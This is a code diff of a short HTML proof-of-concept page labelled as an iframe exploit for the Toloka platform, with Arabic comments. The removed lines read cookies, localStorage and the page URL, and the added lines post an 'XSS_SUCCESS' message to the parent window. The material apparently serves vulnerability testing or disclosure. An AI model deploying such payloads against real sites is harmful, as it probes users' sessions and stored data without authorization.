@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      console.log(window.top === window); // هل السياق الأعلى هو نفسه؟ true تعني أنك في الأعلى
-      console.log(document.cookie);       // هل تستطيع قراءة الكوكيز؟
-      console.log(localStorage);          // هل لديك وصول إلى التخزين المحلي؟
-      console.log(window.location.href);  // ما الرابط الحالي؟
+<head>
+  <meta charset="UTF-8">
+  <title>PoC iframe exploit for Toloka</title>
+</head>
+<body style="background:#000;color:#fff;font-family:monospace;">
+  <h1>🔥 PoC iframe exploit loaded</h1>
+  <p>Domain: <code id="d"></code></p>
+  <script>
+    document.getElementById('d').textContent = location.origin;
 
-      document.body.innerHTML = "✅ XSS has run (check console)";
-    </script>
-  </body>
+    // الماضي: التواصل مع الصفحة الأم
+    window.parent.postMessage("XSS_SUCCESS|" + location.origin, "*");
+
+  
+  </script>
+</body>
 </html>
